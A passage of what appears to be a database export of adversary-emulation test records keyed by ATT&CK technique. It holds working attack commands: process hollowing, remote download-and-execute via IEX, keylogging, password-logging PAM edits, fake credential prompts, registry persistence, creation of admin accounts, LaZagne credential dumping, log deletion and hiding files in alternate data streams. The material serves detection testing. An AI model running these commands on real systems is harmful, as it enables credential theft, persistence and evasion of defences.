$PathToAtomicsFolder\\\\T1055.012\\\\src\\\\Start-Hollow.ps1\\n$ppid=Get-Process #{parent_process_name} | select -expand id\\nStart-Hollow -Sponsor \\"#{sponsor_binary_path}\\" -Hollow \\"#{hollow_binary_path}\\" -ParentPID $ppid -Verbose\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Process Hollowing using PowerShell", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [{"key": "hollow_binary_path", "value": "C:\\\\Windows\\\\System32\\\\cmd.exe"}, {"key": "parent_process_name", "value": "explorer"}, {"key": "sponsor_binary_path", "value": "C:\\\\Windows\\\\System32\\\\notepad.exe"}, {"key": "spawnto_process_name", "value": "notepad"}], "execution_status": "Pass"}, {"cleanup": "Stop-Process -Name \\"#{spawnto_process_name}\\" -ErrorAction Ignore\\n", "command": ["IEX (iwr \\"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\\" -UseBasicParsing) \\nInvoke-MalDoc -macroFile \\"PathToAtomicsFolder\\\\T1055.012\\\\src\\\\T1055.012-macrocode.txt\\" -officeProduct \\"#{ms_product}\\" -sub \\"Exploit\\"\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "RunPE via VBA", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["try {\\n  New-Object -COMObject \\"#{ms_product}.Application\\" | Out-Null\\n  $process = \\"#{ms_product}\\"; if ( $process -eq \\"Word\\") {$process = \\"winword\\"}\\n  Stop-Process -Name $process\\n  exit 0\\n} catch { exit 1 }\\n"], "input_arguments": [{"key": "ms_product", "value": "Word"}], "execution_status": "Pass"}]}}}}
170	\N		\N	yes	P2	\N	2021-07-30 02:57:21.591436+00	T1056.001	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["['https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.001/T1056.001.md']"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.794Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}], "atomicred": [{"cleanup": "Remove-Item $env:TEMP\\\\key.log -ErrorAction Ignore\\n", "command": ["Set-Location $PathToAtomicsFolder\\n.\\\\T1056.001\\\\src\\\\Get-Keystrokes.ps1 -LogPath #{filepath}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Input Capture", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [{"key": "filepath", "value": "$env:TEMP\\\\key.log"}], "execution_status": "Pass"}, {"cleanup": "sudo cp -f /tmp/password-auth.bk /etc/pam.d/password-auth\\nsudo cp -f /tmp/system-auth.bk /etc/pam.d/system-auth\\n", "command": ["if sudo test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth /tmp/password-auth.bk; fi; if sudo test -f /etc/pam.d/system-auth; then sudo cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi; sudo touch /tmp/password-auth.bk sudo touch /tmp/system-auth.bk sudo echo \\"session    required    pam_tty_audit.so enable=* log_password\\" >> /etc/pam.d/password-auth sudo echo \\"session    required    pam_tty_audit.so enable=* log_password\\" >> /etc/pam.d/system-auth"], "executor": "sh", "platform": "linux", "file_name": "", "pre_command": [], "ability_name": "Living off the land Terminal Input Capture on Linux with pam.d", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}]}}}}
189	\N		bat	yes	P2	\N	2021-07-30 02:52:07.158027+00	T1137.002	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["reg add \\"HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Office test\\\\Special\\\\Perf\\" /t REG_SZ /d \\"C:\\\\AtomicRedTeam.dll\\""], "executor": ["cmd"], "platform": "", "file_name": "T1137_002.bat", "platforms": "Windows", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:52.039Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}], "atomicred": [{"cleanup": "reg delete \\"HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Office test\\\\Special\\\\Perf\\"\\n", "command": ["reg add \\"HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Office test\\\\Special\\\\Perf\\" /t REG_SZ /d \\"#{thing_to_execute}\\"\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Office Application Startup Test Persistence", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [{"key": "thing_to_execute", "value": "C:\\\\Path\\\\AtomicRedTeam.dll"}], "execution_status": "Pass"}]}}}}
268	\N		\N	no	P1	\N	2021-07-27 10:00:53.959342+00	T1547.004	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"atomicred": [{"cleanup": "Remove-ItemProperty -Path \\"HKCU:\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\\\" -Name \\"Shell\\" -Force -ErrorAction Ignore\\n", "command": ["Set-ItemProperty \\"HKCU:\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\\\" \\"Shell\\" \\"explorer.exe", " #{binary_to_execute}\\" -Force\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Winlogon Shell Key Persistence - PowerShell", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "binary_to_execute", "value": "C:\\\\Windows\\\\System32\\\\cmd.exe"}], "execution_status": "Pass"}, {"cleanup": "Remove-ItemProperty -Path \\"HKCU:\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\\\" -Name \\"Userinit\\" -Force -ErrorAction Ignore\\n", "command": ["Set-ItemProperty \\"HKCU:\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\\\" \\"Userinit\\" \\"Userinit.exe", " #{binary_to_execute}\\" -Force\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Winlogon Userinit Key Persistence - PowerShell", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "binary_to_execute", "value": "C:\\\\Windows\\\\System32\\\\cmd.exe"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item \\"HKCU:\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\Notify\\" -Force -ErrorAction Ignore\\n", "command": ["New-Item \\"HKCU:\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\Notify\\" -Force\\nSet-ItemProperty \\"HKCU:\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\Notify\\" \\"logon\\" \\"#{binary_to_execute}\\" -Force\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Winlogon Notify Key Logon Persistence - PowerShell", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "binary_to_execute", "value": "C:\\\\Windows\\\\Temp\\\\atomicNotificationPackage.dll"}], "execution_status": "Pass"}]}}}}
185	\N		\N	yes	P2	\N	2021-07-29 04:55:12.895139+00	T1134.001	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["[\\"1. https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1134.001/T1134.001.md\\"]"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.991Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}, {"cleanup": "", "command": ["runas /user:psl cmd"], "executor": ["cmd"], "platform": "", "file_name": null, "platforms": "Windows", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:52.015Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}], "atomicred": [{"cleanup": "", "command": ["IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Named pipe client impersonation", "created_date": "29/07/2021", "post_command": [], "modified_date": "29/07/2021", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "", "command": ["IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique Token -Verbose"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "`SeDebugPrivilege` token duplication", "created_date": "29/07/2021", "post_command": [], "modified_date": "29/07/2021", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}]}}}}
318	\N		\N	yes	P2	\N	2021-07-30 02:59:43.492514+00	T1056.004	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"atomicred": [{"cleanup": "sudo cp -f /tmp/password-auth.bk /etc/pam.d/password-auth\\nsudo cp -f /tmp/system-auth.bk /etc/pam.d/system-auth\\n", "command": ["if sudo test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth /tmp/password-auth.bk; fi; if sudo test -f /etc/pam.d/system-auth; then sudo cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi; sudo touch /tmp/password-auth.bk sudo touch /tmp/system-auth.bk sudo echo \\"session    required    pam_tty_audit.so enable=* log_password\\" >> /etc/pam.d/password-auth sudo echo \\"session    required    pam_tty_audit.so enable=* log_password\\" >> /etc/pam.d/system-auth"], "executor": "sh", "platform": "linux", "file_name": "", "pre_command": [], "ability_name": "Living off the land Terminal Input Capture on Linux with pam.d", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["osascript -e 'tell app \\"System Preferences\\" to activate' -e 'tell app \\"System Preferences\\" to activate' -e 'tell app \\"System Preferences\\" to display dialog \\"Software Update requires that you type your password to apply changes.\\" & return & return  default answer \\"\\" with icon 1 with hidden answer with title \\"Software Update\\"'\\n"], "executor": "bash", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "AppleScript - Prompt User for Password", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["# Creates GUI to prompt for password. Expect long pause before prompt is available.    \\n$cred = $host.UI.PromptForCredential('Windows Security Update'", " ''", "[Environment]::UserName", " [Environment]::UserDomainName)\\n# Using write-warning to allow message to show on console as echo and other similar commands are not visable from the Invoke-AtomicTest framework.\\nwrite-warning $cred.GetNetworkCredential().Password\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "PowerShell - Prompt User for Password", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["mavinject $pid /INJECTRUNNING #{file_name}\\ncurl #{server_name} -UseBasicParsing\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Hook PowerShell TLS Encrypt/Decrypt Messages", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{file_name}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "file_name", "value": "PathToAtomicsFolder\\\\T1056.004\\\\bin\\\\T1056.004x64.dll"}, {"key": "server_name", "value": "https://www.example.com"}], "execution_status": "Pass"}]}}}}
272	\N		\N	no	P1	\N	2021-07-27 10:18:11.673503+00	T1218.001	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"atomicred": [{"cleanup": "NA", "command": ["hh.exe #{local_chm_file}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Compiled HTML Help Local Payload", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{local_chm_file}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "local_chm_file", "value": "PathToAtomicsFolder\\\\T1218.001\\\\src\\\\T1218.001.chm"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["hh.exe #{remote_chm_file}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Compiled HTML Help Remote Payload", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "remote_chm_file", "value": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.001/src/T1218.001.chm"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["Invoke-ATHCompiledHelp -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path}"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Invoke CHM with default Shortcut Command Execution", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\\nif (-not $RequiredModule) {exit 1}\\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) {exit 1} else {exit 0}"], "input_arguments": [{"key": "chm_file_path", "value": "Test.chm"}, {"key": "hh_file_path", "value": "$env:windir\\\\hh.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["Invoke-ATHCompiledHelp -InfoTechStorageHandler #{infotech_storage_handler} -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path}"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Invoke CHM with InfoTech Storage Protocol Handler", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\\nif (-not $RequiredModule) {exit 1}\\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) {exit 1} else {exit 0}"], "input_arguments": [{"key": "hh_file_path", "value": "$env:windir\\\\hh.exe"}, {"key": "infotech_storage_handler", "value": "its"}, {"key": "chm_file_path", "value": "Test.chm"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["Invoke-ATHCompiledHelp -SimulateUserDoubleClick -CHMFilePath #{chm_file_path}"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Invoke CHM Simulate Double click", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\\nif (-not $RequiredModule) {exit 1}\\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) {exit 1} else {exit 0}"], "input_arguments": [{"key": "chm_file_path", "value": "Test.chm"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["Invoke-ATHCompiledHelp -ScriptEngine #{script_engine} -InfoTechStorageHandler #{infotech_storage_handler} -TopicExtension #{topic_extension} -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path}"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Invoke CHM with Script Engine and Help Topic", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\\nif (-not $RequiredModule) {exit 1}\\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) {exit 1} else {exit 0}"], "input_arguments": [{"key": "topic_extension", "value": "html"}, {"key": "hh_file_path", "value": "$env:windir\\\\hh.exe"}, {"key": "infotech_storage_handler", "value": "its"}, {"key": "script_engine", "value": "JScript"}, {"key": "chm_file_path", "value": "Test.chm"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["Invoke-ATHCompiledHelp -ExecuteShortcutCommand -InfoTechStorageHandler #{infotech_storage_handler} -TopicExtension #{topic_extension} -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path}"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Invoke CHM Shortcut Command with ITS and Help Topic", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\\nif (-not $RequiredModule) {exit 1}\\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) {exit 1} else {exit 0}"], "input_arguments": [{"key": "topic_extension", "value": "html"}, {"key": "hh_file_path", "value": "$env:windir\\\\hh.exe"}, {"key": "infotech_storage_handler", "value": "its"}, {"key": "chm_file_path", "value": "Test.chm"}], "execution_status": "Pass"}]}}}}
281	\N		\N	no	P1	\N	2021-07-27 11:05:43.089751+00	T1078.003	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"atomicred": [{"cleanup": "net localgroup administrators art-test /delete >nul 2>&1\\nnet user art-test /delete >nul 2>&1", "command": ["net user art-test /add\\nnet user art-test Password123!\\nnet localgroup administrators art-test /add"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Create local account with admin priviliges", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}]}}}}
307	\N		\N	yes	P2	\N	2021-07-30 02:27:52.931061+00	T1564.004	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"atomicred": [{"cleanup": "Remove-Item #{file_path}\\\\Sysinternals -Force -Recurse -ErrorAction Ignore", "command": ["cd ~/Library/Cookies\\ngrep -q \\"#{search_string}\\" \\"Cookies.binarycookies\\"\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Search macOS Safari Cookies", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [{"key": "search_string", "value": "coinbase"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item #{file_path}\\\\Sysinternals -Force -Recurse -ErrorAction Ignore", "command": ["#{lazagne_path} browsers\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "LaZagne - Credentials from Browser", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["if (Test-Path #{lazagne_path}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "lazagne_path", "value": "PathToAtomicsFolder\\\\T1555.003\\\\bin\\\\LaZagne.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["security -h\\nsecurity find-certificate -a -p > #{cert_export}\\nsecurity import #{cert_export} -k\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Keychain", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "cert_export", "value": "/tmp/certs.pem"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["Start-Process #{powershell_command}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Hidden Window", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "powershell_command", "value": "powershell.exe -WindowStyle hidden calc.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["type C:\\\\temp\\\\evil.exe > \\"C:\\\\Program Files (x86)\\\\TeamViewer\\\\TeamViewer12_Logfile.log:evil.exe\\"\\nextrac32 #{path}\\\\procexp.cab #{path}\\\\file.txt:procexp.exe\\nfindstr /V /L W3AllLov3DonaldTrump #{path}\\\\procexp.exe > #{path}\\\\file.txt:procexp.exe\\ncertutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\\\\temp:ttt\\nmakecab #{path}\\\\autoruns.exe #{path}\\\\cabtest.txt:autoruns.cab\\nprint /D:#{path}\\\\file.txt:autoruns.exe #{path}\\\\Autoruns.exe\\nreg export HKLM\\\\SOFTWARE\\\\Microsoft\\\\Evilreg #{path}\\\\file.txt:evilreg.reg\\nregedit /E #{path}\\\\file.txt:regfile.reg HKEY_CURRENT_USER\\\\MyCustomRegKey\\nexpand \\\\\\\\webdav\\\\folder\\\\file.bat #{path}\\\\file.txt:file.bat\\nesentutl.exe /y #{path}\\\\autoruns.exe /d #{path}\\\\file.txt:autoruns.exe /o \\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Alternate Data Streams (ADS)", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "path", "value": "c:\\\\ADS\\\\"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item \\"#{ads_file_path}\\" -Force -ErrorAction Ignore\\n", "command": ["if (!(Test-Path C:\\\\Users\\\\Public\\\\Libraries\\\\yanki -PathType Container)) {\\n    New-Item -ItemType Directory -Force -Path C:\\\\Users\\\\Public\\\\Libraries\\\\yanki\\n    }\\nStart-Process -FilePath \\"$env:comspec\\" -ArgumentList \\"/c", "type", "#{payload_path}", ">", "`\\"#{ads_file_path}:#{ads_name}`\\"\\"\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Store file in Alternate Data Stream (ADS)", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "payload_path", "value": "c:\\\\windows\\\\system32\\\\cmd.exe"}, {"key": "ads_file_path", "value": "C:\\\\Users\\\\Public\\\\Libraries\\\\yanki\\\\desktop.ini"}, {"key": "ads_name", "value": "desktop.ini"}], "execution_status": "Pass"}, {"cleanup": "del #{file_name} >nul 2>&1\\n", "command": ["echo cmd /c echo \\"Shell code execution.\\"> #{file_name}:#{ads_filename}\\nfor /f \\"usebackq delims=?\\" %i in (#{file_name}:#{ads_filename}) do %i\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Create ADS command prompt", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "file_name", "value": "%temp%\\\\T1564.004_has_ads_cmd.txt"}, {"key": "ads_filename", "value": "adstest.txt"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item -Path #{file_name} -ErrorAction Ignore\\n", "command": ["echo \\"test\\" > #{file_name} | set-content -path test.txt -stream #{ads_filename} -value \\"test\\"\\nset-content -path #{file_name} -stream #{ads_filename} -value \\"test2\\"\\nset-content -path . -stream #{ads_filename} -value \\"test3\\"\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Create ADS PowerShell", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{file_name}) { exit 0 } else { exit 1 }\\n"], "input_arguments": [{"key": "file_name", "value": "$env:TEMP\\\\T1564.004_has_ads_powershell.txt"}, {"key": "ads_filename", "value": "adstest.txt"}], "execution_status": "Pass"}]}}}}
250	\N		bat	yes	P2		2021-07-30 02:21:04.70656+00	T1555.003	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["1. upload and then execute MuddyWater_T1555.bat using below commands.\\nagent_id> upload MuddyWater_T1555_003.bat\\nagent_id> shell MuddyWater_T1555_003.bat\\n\\nIt will dump all passwords using below command.\\nshell C:\\\\Users\\\\user\\\\laZagne.exe browsers -oA -output C:\\\\Users\\\\users\\\\"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:50.432Z", "pre-requisite": [], "pre-requistes": "On Windows target:\\n1. Download LaZagne source code from https://github.com/AlessandroZ/LaZagne on the endpoint.\\nOn Kali:\\n1. At least one listener is running.\\n2. powershell-empire launcher_bat is installed on endpoint.\\n3. Interact with agent.", "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}, {"cleanup": "", "command": ["@ECHO OFF\\n\\ncmd /c C:\\\\Users\\\\user\\\\laZagne.exe browsers -oA -output C:\\\\Users\\\\users\\\\"], "executor": ["cmd"], "platform": "", "file_name": "MuddyWater_T1555_003.bat", "platforms": "Windows", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:50.444Z", "pre-requisite": [], "pre-requistes": "On Windows target:\\n1. Download LaZagne source code from https://github.com/AlessandroZ/LaZagne on the endpoint.\\nOn Kali:\\n1. At least one listener is running.\\n2. powershell-empire launcher_bat is installed on endpoint.\\n3. Interact with agent.", "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}], "atomicred": [{"cleanup": "Remove-Item #{file_path}\\\\Sysinternals -Force -Recurse -ErrorAction Ignore", "command": ["Set-Location -path \\"#{file_path}\\\\Sysinternals\\";\\n./accesschk.exe -accepteula .;\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Run Chrome-password Collector", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["if (Test-Path #{file_path}\\\\SysInternals) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "file_path", "value": "$env:TEMP"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item #{file_path}\\\\Sysinternals -Force -Recurse -ErrorAction Ignore", "command": ["cd ~/Library/Cookies\\ngrep -q \\"#{search_string}\\" \\"Cookies.binarycookies\\"\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Search macOS Safari Cookies", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [{"key": "search_string", "value": "coinbase"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item #{file_path}\\\\Sysinternals -Force -Recurse -ErrorAction Ignore", "command": ["#{lazagne_path} browsers\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "LaZagne - Credentials from Browser", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["if (Test-Path #{lazagne_path}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "lazagne_path", "value": "PathToAtomicsFolder\\\\T1555.003\\\\bin\\\\LaZagne.exe"}], "execution_status": "Pass"}]}}}}
319	\N		\N	no	P2	\N	2021-07-30 03:10:12.27605+00	T1070	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"atomicred": [{"cleanup": "fsutil usn createjournal m=1000 a=100 c:\\n", "command": ["fsutil usn deletejournal /D C:\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Indicator Removal using FSUtil", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}]}}}}
125	\N	\N	\N	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1098.002	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["[\\"https://docs.microsoft.com/en-us/powershell/module/exchange/add-mailboxpermission?view=exchange-ps\\"]"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.087Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
139	\N		bat	yes	P1	\N	2021-07-27 12:02:44.33118+00	T1136.002	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["net user John fadf24as /ADD /DOMAIN"], "executor": ["cmd"], "platform": "", "file_name": "T1136_002.bat", "platforms": "Windows", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.319Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}], "atomicred": [{"cleanup": "net user \\"#{username}\\" >nul 2>&1 /del /domain\\n", "command": ["net user \\"#{username}\\" \\"#{password}\\" /add /domain\\nnet group \\"#{group}\\" \\"#{username}\\" /add /domain\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Create a new Windows domain admin user", "created_date": "27/07/2021", "post_command": [], "modified_date": "27/07/2021", "pre-requisite": [], "input_arguments": [{"key": "username", "value": "T1136.002_Admin"}, {"key": "password", "value": "T1136_pass123!"}, {"key": "group", "value": "Domain Admins"}], "execution_status": "Fail"}, {"cleanup": "net user \\"#{username}\\" >nul 2>&1 /del /domain\\n", "command": ["net user \\"#{username}\\" \\"#{password}\\" /add /domain\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Create a new account similar to ANONYMOUS LOGON", "created_date": "27/07/2021", "post_command": [], "modified_date": "27/07/2021", "pre-requisite": [], "input_arguments": [{"key": "username", "value": "ANONYMOUS  LOGON"}, {"key": "password", "value": "T1136_pass123!"}], "execution_status": "Fail"}, {"cleanup": "net user \\"#{username}\\" >nul 2>&1 /del /domain\\n", "command": ["$SamAccountName = '#{username}'\\n$AccountPassword = ConvertTo-SecureString '#{password}' -AsPlainText -Force\\nAdd-Type -AssemblyName 